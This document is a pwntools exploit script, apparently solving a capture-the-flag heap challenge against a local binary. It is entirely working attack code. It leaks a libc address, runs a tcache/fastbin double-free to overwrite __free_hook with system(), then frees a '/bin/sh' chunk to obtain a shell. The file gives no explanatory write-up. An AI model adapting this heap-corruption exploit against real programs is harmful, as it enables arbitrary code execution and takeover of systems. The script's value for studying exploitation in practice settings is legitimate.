from pwn import *
elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


# leak libc address
add_chunk(0, 0x410)
add_chunk(1, 0x10)
delete_chunk(0)
add_chunk(0, 0x410)
show_chunk(0)
libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ecbe0


# allocate 14 chunks
for i in range(14):
    add_chunk(i, 0x50)

# tcache -> 6 -> 5 -> 4 -> 3 -> 2 -> 1 -> 0
# fastbin -> 13 -> 12 -> 11 -> 10 -> 9 -> 8 -> 7
for i in range(14):
    delete_chunk(i)

# tcache -> 5 -> 4 -> 3 -> 2 -> 1 -> 0
# fastbin -> 13 -> 12 -> 11 -> 10 -> 9 -> 8 -> 7
add_chunk(0, 0x50)

# double free
# tcache -> 7 -> 5 -> 4 -> 3 -> 2 -> 1 -> 0
# fastbin -> 13 -> 12 -> 11 -> 10 -> 9 -> 8 -> 7
delete_chunk(7)

# tcache -> 5 -> 4 -> 3 -> 2 -> 1 -> 0
# fastbin -> 13 -> 12 -> 11 -> 10 -> 9 -> 8 -> 7 -> free_hook
add_chunk(7, 0x50)
edit_chunk(7, p64(libc.sym['__free_hook'] - 0x10))

# tcache -> null
# fastbin -> 13 -> 12 -> 11 -> 10 -> 9 -> 8 -> 7 -> free_hook
for i in range(1, 7):
    add_chunk(i, 0x50)

# tcache -> free_hook -> 7 -> 8 -> 9 -> 10 -> 11 -> 12
# fastbin -> null
add_chunk(1, 0x50)

# tcache -> 7 -> 8 -> 9 -> 10 -> 11 -> 12
# fastbin -> null
add_chunk(0, 0x50) # free_hook

# getshell
edit_chunk(0, p64(libc.sym['system']))
edit_chunk(1, '/bin/sh\x00')
delete_chunk(1)

# gdb.attach(p)
p.interactive()
